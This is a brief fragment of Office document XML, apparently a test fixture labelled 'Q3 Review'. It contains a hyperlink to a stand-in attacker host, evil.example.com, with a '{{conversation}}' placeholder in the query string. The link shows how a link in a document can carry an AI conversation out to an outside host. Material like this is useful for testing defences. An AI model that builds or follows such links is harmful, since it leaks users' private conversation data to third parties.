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hyperlink" Target="https://evil.example.com/?q={{conversation}}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Q3 Review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5486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>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>click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